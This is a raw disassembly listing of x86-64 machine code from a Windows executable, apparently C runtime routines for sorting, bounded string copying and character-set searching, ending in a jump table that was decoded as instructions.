   14000c463:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   14000c468:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000c46c:	88 0a                	mov    %cl,(%rdx)
   14000c46e:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000c472:	49 83 e8 01          	sub    $0x1,%r8
   14000c476:	75 e8                	jne    0x14000c460
   14000c478:	48 3b fe             	cmp    %rsi,%rdi
   14000c47b:	48 8b c3             	mov    %rbx,%rax
   14000c47e:	48 0f 45 c7          	cmovne %rdi,%rax
   14000c482:	48 8b f8             	mov    %rax,%rdi
   14000c485:	e9 76 ff ff ff       	jmp    0x14000c400
   14000c48a:	48 3b fd             	cmp    %rbp,%rdi
   14000c48d:	73 18                	jae    0x14000c4a7
   14000c48f:	90                   	nop
   14000c490:	49 2b ee             	sub    %r14,%rbp
   14000c493:	48 3b ef             	cmp    %rdi,%rbp
   14000c496:	76 0f                	jbe    0x14000c4a7
   14000c498:	48 8b d7             	mov    %rdi,%rdx
   14000c49b:	48 8b cd             	mov    %rbp,%rcx
   14000c49e:	41 ff d4             	call   *%r12
   14000c4a1:	85 c0                	test   %eax,%eax
   14000c4a3:	74 eb                	je     0x14000c490
   14000c4a5:	eb 15                	jmp    0x14000c4bc
   14000c4a7:	49 2b ee             	sub    %r14,%rbp
   14000c4aa:	49 3b ed             	cmp    %r13,%rbp
   14000c4ad:	76 0d                	jbe    0x14000c4bc
   14000c4af:	48 8b d7             	mov    %rdi,%rdx
   14000c4b2:	48 8b cd             	mov    %rbp,%rcx
   14000c4b5:	41 ff d4             	call   *%r12
   14000c4b8:	85 c0                	test   %eax,%eax
   14000c4ba:	74 eb                	je     0x14000c4a7
   14000c4bc:	49 8b cf             	mov    %r15,%rcx
   14000c4bf:	48 8b c5             	mov    %rbp,%rax
   14000c4c2:	48 2b cb             	sub    %rbx,%rcx
   14000c4c5:	49 2b c5             	sub    %r13,%rax
   14000c4c8:	48 3b c1             	cmp    %rcx,%rax
   14000c4cb:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000c4d0:	7c 2b                	jl     0x14000c4fd
   14000c4d2:	4c 3b ed             	cmp    %rbp,%r13
   14000c4d5:	73 15                	jae    0x14000c4ec
   14000c4d7:	4c 89 6c cc 30       	mov    %r13,0x30(%rsp,%rcx,8)
   14000c4dc:	48 89 ac cc 20 02 00 	mov    %rbp,0x220(%rsp,%rcx,8)
   14000c4e3:	00 
   14000c4e4:	48 ff c1             	inc    %rcx
   14000c4e7:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000c4ec:	49 3b df             	cmp    %r15,%rbx
   14000c4ef:	0f 83 1e fe ff ff    	jae    0x14000c313
   14000c4f5:	4c 8b eb             	mov    %rbx,%r13
   14000c4f8:	e9 93 fd ff ff       	jmp    0x14000c290
   14000c4fd:	49 3b df             	cmp    %r15,%rbx
   14000c500:	73 15                	jae    0x14000c517
   14000c502:	48 89 5c cc 30       	mov    %rbx,0x30(%rsp,%rcx,8)
   14000c507:	4c 89 bc cc 20 02 00 	mov    %r15,0x220(%rsp,%rcx,8)
   14000c50e:	00 
   14000c50f:	48 ff c1             	inc    %rcx
   14000c512:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000c517:	4c 3b ed             	cmp    %rbp,%r13
   14000c51a:	0f 83 f3 fd ff ff    	jae    0x14000c313
   14000c520:	4c 8b fd             	mov    %rbp,%r15
   14000c523:	e9 68 fd ff ff       	jmp    0x14000c290
   14000c528:	48 8b b4 24 30 04 00 	mov    0x430(%rsp),%rsi
   14000c52f:	00 
   14000c530:	48 8b ac 24 38 04 00 	mov    0x438(%rsp),%rbp
   14000c537:	00 
   14000c538:	48 8b 9c 24 40 04 00 	mov    0x440(%rsp),%rbx
   14000c53f:	00 
   14000c540:	48 8b bc 24 28 04 00 	mov    0x428(%rsp),%rdi
   14000c547:	00 
   14000c548:	48 8b 8c 24 10 04 00 	mov    0x410(%rsp),%rcx
   14000c54f:	00 
   14000c550:	48 33 cc             	xor    %rsp,%rcx
   14000c553:	e8 b8 6b ff ff       	call   0x140003110
   14000c558:	48 81 c4 48 04 00 00 	add    $0x448,%rsp
   14000c55f:	41 5f                	pop    %r15
   14000c561:	41 5e                	pop    %r14
   14000c563:	41 5d                	pop    %r13
   14000c565:	41 5c                	pop    %r12
   14000c567:	c3                   	ret
   14000c568:	cc                   	int3
   14000c569:	cc                   	int3
   14000c56a:	cc                   	int3
   14000c56b:	cc                   	int3
   14000c56c:	cc                   	int3
   14000c56d:	cc                   	int3
   14000c56e:	cc                   	int3
   14000c56f:	cc                   	int3
   14000c570:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c575:	57                   	push   %rdi
   14000c576:	48 83 ec 20          	sub    $0x20,%rsp
   14000c57a:	49 8b f9             	mov    %r9,%rdi
   14000c57d:	4d 8b d0             	mov    %r8,%r10
   14000c580:	48 8b da             	mov    %rdx,%rbx
   14000c583:	4c 8b d9             	mov    %rcx,%r11
   14000c586:	4d 85 c9             	test   %r9,%r9
   14000c589:	75 17                	jne    0x14000c5a2
   14000c58b:	48 85 c9             	test   %rcx,%rcx
   14000c58e:	75 17                	jne    0x14000c5a7
   14000c590:	48 85 d2             	test   %rdx,%rdx
   14000c593:	75 34                	jne    0x14000c5c9
   14000c595:	33 c0                	xor    %eax,%eax
   14000c597:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000c59c:	48 83 c4 20          	add    $0x20,%rsp
   14000c5a0:	5f                   	pop    %rdi
   14000c5a1:	c3                   	ret
   14000c5a2:	4d 85 db             	test   %r11,%r11
   14000c5a5:	74 22                	je     0x14000c5c9
   14000c5a7:	48 85 db             	test   %rbx,%rbx
   14000c5aa:	74 1d                	je     0x14000c5c9
   14000c5ac:	48 85 ff             	test   %rdi,%rdi
   14000c5af:	75 10                	jne    0x14000c5c1
   14000c5b1:	40 88 39             	mov    %dil,(%rcx)
   14000c5b4:	33 c0                	xor    %eax,%eax
   14000c5b6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000c5bb:	48 83 c4 20          	add    $0x20,%rsp
   14000c5bf:	5f                   	pop    %rdi
   14000c5c0:	c3                   	ret
   14000c5c1:	4d 85 d2             	test   %r10,%r10
   14000c5c4:	75 23                	jne    0x14000c5e9
   14000c5c6:	44 88 11             	mov    %r10b,(%rcx)
   14000c5c9:	e8 9e b9 ff ff       	call   0x140007f6c
   14000c5ce:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000c5d4:	e8 eb b7 ff ff       	call   0x140007dc4
   14000c5d9:	b8 16 00 00 00       	mov    $0x16,%eax
   14000c5de:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000c5e3:	48 83 c4 20          	add    $0x20,%rsp
   14000c5e7:	5f                   	pop    %rdi
   14000c5e8:	c3                   	ret
   14000c5e9:	4d 2b d3             	sub    %r11,%r10
   14000c5ec:	4c 8b c7             	mov    %rdi,%r8
   14000c5ef:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   14000c5f3:	75 2b                	jne    0x14000c620
   14000c5f5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000c5fc:	00 00 00 00 
   14000c600:	41 0f b6 04 0a       	movzbl (%r10,%rcx,1),%eax
   14000c605:	88 01                	mov    %al,(%rcx)
   14000c607:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   14000c60b:	84 c0                	test   %al,%al
   14000c60d:	74 86                	je     0x14000c595
   14000c60f:	48 83 ea 01          	sub    $0x1,%rdx
   14000c613:	75 eb                	jne    0x14000c600
   14000c615:	eb 3d                	jmp    0x14000c654
   14000c617:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000c61e:	00 00 
   14000c620:	41 0f b6 04 0a       	movzbl (%r10,%rcx,1),%eax
   14000c625:	4d 8b c8             	mov    %r8,%r9
   14000c628:	88 01                	mov    %al,(%rcx)
   14000c62a:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   14000c62e:	84 c0                	test   %al,%al
   14000c630:	0f 84 5f ff ff ff    	je     0x14000c595
   14000c636:	48 83 ea 01          	sub    $0x1,%rdx
   14000c63a:	74 06                	je     0x14000c642
   14000c63c:	49 83 e8 01          	sub    $0x1,%r8
   14000c640:	75 de                	jne    0x14000c620
   14000c642:	48 85 d2             	test   %rdx,%rdx
   14000c645:	49 8d 41 ff          	lea    -0x1(%r9),%rax
   14000c649:	49 0f 44 c1          	cmove  %r9,%rax
   14000c64d:	48 85 c0             	test   %rax,%rax
   14000c650:	75 02                	jne    0x14000c654
   14000c652:	88 01                	mov    %al,(%rcx)
   14000c654:	48 85 d2             	test   %rdx,%rdx
   14000c657:	0f 85 38 ff ff ff    	jne    0x14000c595
   14000c65d:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   14000c661:	75 13                	jne    0x14000c676
   14000c663:	41 88 54 1b ff       	mov    %dl,-0x1(%r11,%rbx,1)
   14000c668:	8d 42 50             	lea    0x50(%rdx),%eax
   14000c66b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000c670:	48 83 c4 20          	add    $0x20,%rsp
   14000c674:	5f                   	pop    %rdi
   14000c675:	c3                   	ret
   14000c676:	41 c6 03 00          	movb   $0x0,(%r11)
   14000c67a:	e8 ed b8 ff ff       	call   0x140007f6c
   14000c67f:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   14000c685:	e8 3a b7 ff ff       	call   0x140007dc4
   14000c68a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000c68f:	b8 22 00 00 00       	mov    $0x22,%eax
   14000c694:	48 83 c4 20          	add    $0x20,%rsp
   14000c698:	5f                   	pop    %rdi
   14000c699:	c3                   	ret
   14000c69a:	cc                   	int3
   14000c69b:	cc                   	int3
   14000c69c:	cc                   	int3
   14000c69d:	cc                   	int3
   14000c69e:	cc                   	int3
   14000c69f:	cc                   	int3
   14000c6a0:	48 83 ec 38          	sub    $0x38,%rsp
   14000c6a4:	48 8b 05 55 19 01 00 	mov    0x11955(%rip),%rax        # 0x14001e000
   14000c6ab:	48 33 c4             	xor    %rsp,%rax
   14000c6ae:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000c6b3:	0f b6 02             	movzbl (%rdx),%eax
   14000c6b6:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000c6b9:	4c 8b c1             	mov    %rcx,%r8
   14000c6bc:	0f 11 04 24          	movups %xmm0,(%rsp)
   14000c6c0:	0f 11 44 24 10       	movups %xmm0,0x10(%rsp)
   14000c6c5:	84 c0                	test   %al,%al
   14000c6c7:	74 1d                	je     0x14000c6e6
   14000c6c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   14000c6d0:	0f b6 c0             	movzbl %al,%eax
   14000c6d3:	48 8d 0c 24          	lea    (%rsp),%rcx
   14000c6d7:	0f ab 01             	bts    %eax,(%rcx)
   14000c6da:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   14000c6de:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000c6e2:	84 c0                	test   %al,%al
   14000c6e4:	75 ea                	jne    0x14000c6d0
   14000c6e6:	41 0f b6 08          	movzbl (%r8),%ecx
   14000c6ea:	84 c9                	test   %cl,%cl
   14000c6ec:	74 23                	je     0x14000c711
   14000c6ee:	66 90                	xchg   %ax,%ax
   14000c6f0:	0f b6 c1             	movzbl %cl,%eax
   14000c6f3:	80 e1 07             	and    $0x7,%cl
   14000c6f6:	48 c1 e8 03          	shr    $0x3,%rax
   14000c6fa:	0f b6 14 04          	movzbl (%rsp,%rax,1),%edx
   14000c6fe:	d2 ea                	shr    %cl,%dl
   14000c700:	f6 c2 01             	test   $0x1,%dl
   14000c703:	75 20                	jne    0x14000c725
   14000c705:	41 0f b6 48 01       	movzbl 0x1(%r8),%ecx
   14000c70a:	49 ff c0             	inc    %r8
   14000c70d:	84 c9                	test   %cl,%cl
   14000c70f:	75 df                	jne    0x14000c6f0
   14000c711:	33 c0                	xor    %eax,%eax
   14000c713:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000c718:	48 33 cc             	xor    %rsp,%rcx
   14000c71b:	e8 f0 69 ff ff       	call   0x140003110
   14000c720:	48 83 c4 38          	add    $0x38,%rsp
   14000c724:	c3                   	ret
   14000c725:	49 8b c0             	mov    %r8,%rax
   14000c728:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000c72d:	48 33 cc             	xor    %rsp,%rcx
   14000c730:	e8 db 69 ff ff       	call   0x140003110
   14000c735:	48 83 c4 38          	add    $0x38,%rsp
   14000c739:	c3                   	ret
   14000c73a:	cc                   	int3
   14000c73b:	cc                   	int3
   14000c73c:	cc                   	int3
   14000c73d:	cc                   	int3
   14000c73e:	cc                   	int3
   14000c73f:	cc                   	int3
   14000c740:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000c745:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000c74a:	57                   	push   %rdi
   14000c74b:	4c 8b d2             	mov    %rdx,%r10
   14000c74e:	48 8d 35 ab 38 ff ff 	lea    -0xc755(%rip),%rsi        # 0x140000000
   14000c755:	41 83 e2 0f          	and    $0xf,%r10d
   14000c759:	48 8b da             	mov    %rdx,%rbx
   14000c75c:	49 2b da             	sub    %r10,%rbx
   14000c75f:	33 ff                	xor    %edi,%edi
   14000c761:	4c 8b da             	mov    %rdx,%r11
   14000c764:	4c 8b c1             	mov    %rcx,%r8
   14000c767:	0f 57 db             	xorps  %xmm3,%xmm3
   14000c76a:	49 8d 42 ff          	lea    -0x1(%r10),%rax
   14000c76e:	f3 0f 6f 0b          	movdqu (%rbx),%xmm1
   14000c772:	48 83 f8 0e          	cmp    $0xe,%rax
   14000c776:	77 73                	ja     0x14000c7eb
   14000c778:	8b 84 86 3c ca 00 00 	mov    0xca3c(%rsi,%rax,4),%eax
   14000c77f:	48 03 c6             	add    %rsi,%rax
   14000c782:	ff e0                	jmp    *%rax
   14000c784:	66 0f 73 d9 01       	psrldq $0x1,%xmm1
   14000c789:	eb 60                	jmp    0x14000c7eb
   14000c78b:	66 0f 73 d9 02       	psrldq $0x2,%xmm1
   14000c790:	eb 59                	jmp    0x14000c7eb
   14000c792:	66 0f 73 d9 03       	psrldq $0x3,%xmm1
   14000c797:	eb 52                	jmp    0x14000c7eb
   14000c799:	66 0f 73 d9 04       	psrldq $0x4,%xmm1
   14000c79e:	eb 4b                	jmp    0x14000c7eb
   14000c7a0:	66 0f 73 d9 05       	psrldq $0x5,%xmm1
   14000c7a5:	eb 44                	jmp    0x14000c7eb
   14000c7a7:	66 0f 73 d9 06       	psrldq $0x6,%xmm1
   14000c7ac:	eb 3d                	jmp    0x14000c7eb
   14000c7ae:	66 0f 73 d9 07       	psrldq $0x7,%xmm1
   14000c7b3:	eb 36                	jmp    0x14000c7eb
   14000c7b5:	66 0f 73 d9 08       	psrldq $0x8,%xmm1
   14000c7ba:	eb 2f                	jmp    0x14000c7eb
   14000c7bc:	66 0f 73 d9 09       	psrldq $0x9,%xmm1
   14000c7c1:	eb 28                	jmp    0x14000c7eb
   14000c7c3:	66 0f 73 d9 0a       	psrldq $0xa,%xmm1
   14000c7c8:	eb 21                	jmp    0x14000c7eb
   14000c7ca:	66 0f 73 d9 0b       	psrldq $0xb,%xmm1
   14000c7cf:	eb 1a                	jmp    0x14000c7eb
   14000c7d1:	66 0f 73 d9 0c       	psrldq $0xc,%xmm1
   14000c7d6:	eb 13                	jmp    0x14000c7eb
   14000c7d8:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   14000c7dd:	eb 0c                	jmp    0x14000c7eb
   14000c7df:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   14000c7e4:	eb 05                	jmp    0x14000c7eb
   14000c7e6:	66 0f 73 d9 0f       	psrldq $0xf,%xmm1
   14000c7eb:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000c7ee:	41 b9 0f 00 00 00    	mov    $0xf,%r9d
   14000c7f4:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   14000c7f8:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   14000c7fc:	85 c0                	test   %eax,%eax
   14000c7fe:	0f 84 2f 01 00 00    	je     0x14000c933
   14000c804:	0f bc d0             	bsf    %eax,%edx
   14000c807:	4d 85 d2             	test   %r10,%r10
   14000c80a:	75 06                	jne    0x14000c812
   14000c80c:	41 8d 79 f2          	lea    -0xe(%r9),%edi
   14000c810:	eb 11                	jmp    0x14000c823
   14000c812:	b9 10 00 00 00       	mov    $0x10,%ecx
   14000c817:	8b c2                	mov    %edx,%eax
   14000c819:	49 2b ca             	sub    %r10,%rcx
   14000c81c:	48 3b c1             	cmp    %rcx,%rax
   14000c81f:	40 0f 92 c7          	setb   %dil
   14000c823:	41 8b c1             	mov    %r9d,%eax
   14000c826:	2b c2                	sub    %edx,%eax
   14000c828:	41 3b c1             	cmp    %r9d,%eax
   14000c82b:	0f 87 cf 00 00 00    	ja     0x14000c900
   14000c831:	8b 8c 86 78 ca 00 00 	mov    0xca78(%rsi,%rax,4),%ecx
   14000c838:	48 03 ce             	add    %rsi,%rcx
   14000c83b:	ff e1                	jmp    *%rcx
   14000c83d:	66 0f 73 f9 01       	pslldq $0x1,%xmm1
   14000c842:	66 0f 73 d9 01       	psrldq $0x1,%xmm1
   14000c847:	e9 b4 00 00 00       	jmp    0x14000c900
   14000c84c:	66 0f 73 f9 02       	pslldq $0x2,%xmm1
   14000c851:	66 0f 73 d9 02       	psrldq $0x2,%xmm1
   14000c856:	e9 a5 00 00 00       	jmp    0x14000c900
   14000c85b:	66 0f 73 f9 03       	pslldq $0x3,%xmm1
   14000c860:	66 0f 73 d9 03       	psrldq $0x3,%xmm1
   14000c865:	e9 96 00 00 00       	jmp    0x14000c900
   14000c86a:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
   14000c86f:	66 0f 73 d9 04       	psrldq $0x4,%xmm1
   14000c874:	e9 87 00 00 00       	jmp    0x14000c900
   14000c879:	66 0f 73 f9 05       	pslldq $0x5,%xmm1
   14000c87e:	66 0f 73 d9 05       	psrldq $0x5,%xmm1
   14000c883:	eb 7b                	jmp    0x14000c900
   14000c885:	66 0f 73 f9 06       	pslldq $0x6,%xmm1
   14000c88a:	66 0f 73 d9 06       	psrldq $0x6,%xmm1
   14000c88f:	eb 6f                	jmp    0x14000c900
   14000c891:	66 0f 73 f9 07       	pslldq $0x7,%xmm1
   14000c896:	66 0f 73 d9 07       	psrldq $0x7,%xmm1
   14000c89b:	eb 63                	jmp    0x14000c900
   14000c89d:	66 0f 73 f9 08       	pslldq $0x8,%xmm1
   14000c8a2:	66 0f 73 d9 08       	psrldq $0x8,%xmm1
   14000c8a7:	eb 57                	jmp    0x14000c900
   14000c8a9:	66 0f 73 f9 09       	pslldq $0x9,%xmm1
   14000c8ae:	66 0f 73 d9 09       	psrldq $0x9,%xmm1
   14000c8b3:	eb 4b                	jmp    0x14000c900
   14000c8b5:	66 0f 73 f9 0a       	pslldq $0xa,%xmm1
   14000c8ba:	66 0f 73 d9 0a       	psrldq $0xa,%xmm1
   14000c8bf:	eb 3f                	jmp    0x14000c900
   14000c8c1:	66 0f 73 f9 0b       	pslldq $0xb,%xmm1
   14000c8c6:	66 0f 73 d9 0b       	psrldq $0xb,%xmm1
   14000c8cb:	eb 33                	jmp    0x14000c900
   14000c8cd:	66 0f 73 f9 0c       	pslldq $0xc,%xmm1
   14000c8d2:	66 0f 73 d9 0c       	psrldq $0xc,%xmm1
   14000c8d7:	eb 27                	jmp    0x14000c900
   14000c8d9:	66 0f 73 f9 0d       	pslldq $0xd,%xmm1
   14000c8de:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   14000c8e3:	eb 1b                	jmp    0x14000c900
   14000c8e5:	66 0f 73 f9 0e       	pslldq $0xe,%xmm1
   14000c8ea:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   14000c8ef:	eb 0f                	jmp    0x14000c900
   14000c8f1:	66 0f 73 f9 0f       	pslldq $0xf,%xmm1
   14000c8f6:	66 0f 73 d9 0f       	psrldq $0xf,%xmm1
   14000c8fb:	eb 03                	jmp    0x14000c900
   14000c8fd:	0f 57 c9             	xorps  %xmm1,%xmm1
   14000c900:	85 ff                	test   %edi,%edi
   14000c902:	0f 85 e1 00 00 00    	jne    0x14000c9e9
   14000c908:	f3 0f 6f 53 10       	movdqu 0x10(%rbx),%xmm2
   14000c90d:	66 0f 6f c2          	movdqa %xmm2,%xmm0
   14000c911:	66 0f 74 c3          	pcmpeqb %xmm3,%xmm0
   14000c915:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   14000c919:	85 c0                	test   %eax,%eax
   14000c91b:	75 35                	jne    0x14000c952
   14000c91d:	49 8b d3             	mov    %r11,%rdx
   14000c920:	49 8b c8             	mov    %r8,%rcx
   14000c923:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   14000c928:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
   14000c92d:	5f                   	pop    %rdi
   14000c92e:	e9 6d fd ff ff       	jmp    0x14000c6a0
   14000c933:	4d 85 d2             	test   %r10,%r10
   14000c936:	75 d0                	jne    0x14000c908
   14000c938:	40 38 7b 01          	cmp    %dil,0x1(%rbx)
   14000c93c:	0f 84 a7 00 00 00    	je     0x14000c9e9
   14000c942:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   14000c947:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
   14000c94c:	5f                   	pop    %rdi
   14000c94d:	e9 4e fd ff ff       	jmp    0x14000c6a0
   14000c952:	0f bc c8             	bsf    %eax,%ecx
   14000c955:	8b c1                	mov    %ecx,%eax
   14000c957:	49 2b c2             	sub    %r10,%rax
   14000c95a:	48 83 c0 10          	add    $0x10,%rax
   14000c95e:	48 83 f8 10          	cmp    $0x10,%rax
   14000c962:	77 b9                	ja     0x14000c91d
   14000c964:	44 2b c9             	sub    %ecx,%r9d
   14000c967:	41 83 f9 0f          	cmp    $0xf,%r9d
   14000c96b:	77 79                	ja     0x14000c9e6
   14000c96d:	42 8b 8c 8e b8 ca 00 	mov    0xcab8(%rsi,%r9,4),%ecx
   14000c974:	00 
   14000c975:	48 03 ce             	add    %rsi,%rcx
   14000c978:	ff e1                	jmp    *%rcx
   14000c97a:	66 0f 73 fa 01       	pslldq $0x1,%xmm2
   14000c97f:	eb 65                	jmp    0x14000c9e6
   14000c981:	66 0f 73 fa 02       	pslldq $0x2,%xmm2
   14000c986:	eb 5e                	jmp    0x14000c9e6
   14000c988:	66 0f 73 fa 03       	pslldq $0x3,%xmm2
   14000c98d:	eb 57                	jmp    0x14000c9e6
   14000c98f:	66 0f 73 fa 04       	pslldq $0x4,%xmm2
   14000c994:	eb 50                	jmp    0x14000c9e6
   14000c996:	66 0f 73 fa 05       	pslldq $0x5,%xmm2
   14000c99b:	eb 49                	jmp    0x14000c9e6
   14000c99d:	66 0f 73 fa 06       	pslldq $0x6,%xmm2
   14000c9a2:	eb 42                	jmp    0x14000c9e6
   14000c9a4:	66 0f 73 fa 07       	pslldq $0x7,%xmm2
   14000c9a9:	eb 3b                	jmp    0x14000c9e6
   14000c9ab:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   14000c9b0:	eb 34                	jmp    0x14000c9e6
   14000c9b2:	66 0f 73 fa 09       	pslldq $0x9,%xmm2
   14000c9b7:	eb 2d                	jmp    0x14000c9e6
   14000c9b9:	66 0f 73 fa 0a       	pslldq $0xa,%xmm2
   14000c9be:	eb 26                	jmp    0x14000c9e6
   14000c9c0:	66 0f 73 fa 0b       	pslldq $0xb,%xmm2
   14000c9c5:	eb 1f                	jmp    0x14000c9e6
   14000c9c7:	66 0f 73 fa 0c       	pslldq $0xc,%xmm2
   14000c9cc:	eb 18                	jmp    0x14000c9e6
   14000c9ce:	66 0f 73 fa 0d       	pslldq $0xd,%xmm2
   14000c9d3:	eb 11                	jmp    0x14000c9e6
   14000c9d5:	66 0f 73 fa 0e       	pslldq $0xe,%xmm2
   14000c9da:	eb 0a                	jmp    0x14000c9e6
   14000c9dc:	66 0f 73 fa 0f       	pslldq $0xf,%xmm2
   14000c9e1:	eb 03                	jmp    0x14000c9e6
   14000c9e3:	0f 57 d2             	xorps  %xmm2,%xmm2
   14000c9e6:	0f 56 ca             	orps   %xmm2,%xmm1
   14000c9e9:	41 0f b6 00          	movzbl (%r8),%eax
   14000c9ed:	84 c0                	test   %al,%al
   14000c9ef:	74 2c                	je     0x14000ca1d
   14000c9f1:	0f be c0             	movsbl %al,%eax
   14000c9f4:	66 0f 6e c0          	movd   %eax,%xmm0
   14000c9f8:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   14000c9fc:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   14000ca00:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
   14000ca05:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   14000ca09:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   14000ca0d:	85 c0                	test   %eax,%eax
   14000ca0f:	75 1a                	jne    0x14000ca2b
   14000ca11:	41 0f b6 40 01       	movzbl 0x1(%r8),%eax
   14000ca16:	49 ff c0             	inc    %r8
   14000ca19:	84 c0                	test   %al,%al
   14000ca1b:	75 d4                	jne    0x14000c9f1
   14000ca1d:	33 c0                	xor    %eax,%eax
   14000ca1f:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   14000ca24:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
   14000ca29:	5f                   	pop    %rdi
   14000ca2a:	c3                   	ret
   14000ca2b:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   14000ca30:	49 8b c0             	mov    %r8,%rax
   14000ca33:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
   14000ca38:	5f                   	pop    %rdi
   14000ca39:	c3                   	ret
   14000ca3a:	66 90                	xchg   %ax,%ax
   14000ca3c:	84 c7                	test   %al,%bh
   14000ca3e:	00 00                	add    %al,(%rax)
   14000ca40:	8b c7                	mov    %edi,%eax
   14000ca42:	00 00                	add    %al,(%rax)
   14000ca44:	92                   	xchg   %eax,%edx
   14000ca45:	c7 00 00 99 c7 00    	movl   $0xc79900,(%rax)
   14000ca4b:	00 a0 c7 00 00 a7    	add    %ah,-0x58ffff39(%rax)
   14000ca51:	c7 00 00 ae c7 00    	movl   $0xc7ae00,(%rax)
   14000ca57:	00 b5 c7 00 00 bc    	add    %dh,-0x43ffff39(%rbp)
   14000ca5d:	c7 00 00 c3 c7 00    	movl   $0xc7c300,(%rax)
   14000ca63:	00 ca                	add    %cl,%dl
   14000ca65:	c7 00 00 d1 c7 00    	movl   $0xc7d100,(%rax)
   14000ca6b:	00 d8                	add    %bl,%al
   14000ca6d:	c7 00 00 df c7 00    	movl   $0xc7df00,(%rax)
   14000ca73:	00 e6                	add    %ah,%dh
   14000ca75:	c7 00 00 3d c8 00    	movl   $0xc83d00,(%rax)
   14000ca7b:	00 4c c8 00          	add    %cl,0x0(%rax,%rcx,8)
   14000ca7f:	00 5b c8             	add    %bl,-0x38(%rbx)
   14000ca82:	00 00                	add    %al,(%rax)
   14000ca84:	6a c8                	push   $0xffffffffffffffc8
   14000ca86:	00 00                	add    %al,(%rax)
   14000ca88:	79 c8                	jns    0x14000ca52
   14000ca8a:	00 00                	add    %al,(%rax)
   14000ca8c:	85 c8                	test   %ecx,%eax
   14000ca8e:	00 00                	add    %al,(%rax)
   14000ca90:	91                   	xchg   %eax,%ecx
   14000ca91:	c8 00 00 9d          	enter  $0x0,$0x9d
   14000ca95:	c8 00 00 a9          	enter  $0x0,$0xa9
   14000ca99:	c8 00 00 b5          	enter  $0x0,$0xb5
   14000ca9d:	c8 00 00 c1          	enter  $0x0,$0xc1
   14000caa1:	c8 00 00 cd          	enter  $0x0,$0xcd
   14000caa5:	c8 00 00 d9          	enter  $0x0,$0xd9
   14000caa9:	c8 00 00 e5          	enter  $0x0,$0xe5
   14000caad:	c8 00 00 f1          	enter  $0x0,$0xf1
   14000cab1:	c8 00 00 fd          	enter  $0x0,$0xfd
   14000cab5:	c8 00 00 7a          	enter  $0x0,$0x7a
   14000cab9:	c9                   	leave
   14000caba:	00 00                	add    %al,(%rax)
   14000cabc:	81 c9 00 00 88 c9    	or     $0xc9880000,%ecx
   14000cac2:	00 00                	add    %al,(%rax)
   14000cac4:	8f c9 00 00          	(bad)
   14000cac8:	96                   	xchg   %eax,%esi
   14000cac9:	c9                   	leave
   14000caca:	00 00                	add    %al,(%rax)
   14000cacc:	9d                   	popf
   14000cacd:	c9                   	leave
   14000cace:	00 00                	add    %al,(%rax)
   14000cad0:	a4                   	movsb  (%rsi),(%rdi)
   14000cad1:	c9                   	leave
   14000cad2:	00 00                	add    %al,(%rax)
   14000cad4:	ab                   	stos   %eax,(%rdi)
   14000cad5:	c9                   	leave
   14000cad6:	00 00                	add    %al,(%rax)
   14000cad8:	b2 c9                	mov    $0xc9,%dl
   14000cada:	00 00                	add    %al,(%rax)
   14000cadc:	b9 c9 00 00 c0       	mov    $0xc00000c9,%ecx
   14000cae1:	c9                   	leave
   14000cae2:	00 00                	add    %al,(%rax)
   14000cae4:	c7                   	(bad)
   14000cae5:	c9                   	leave
   14000cae6:	00 00                	add    %al,(%rax)
   14000cae8:	ce                   	(bad)
   14000cae9:	c9                   	leave
   14000caea:	00 00                	add    %al,(%rax)
   14000caec:	d5 c9 00 00          	{rex2 0xc9} sldt (%r8)
   14000caf0:	dc c9                	fmul   %st,%st(1)
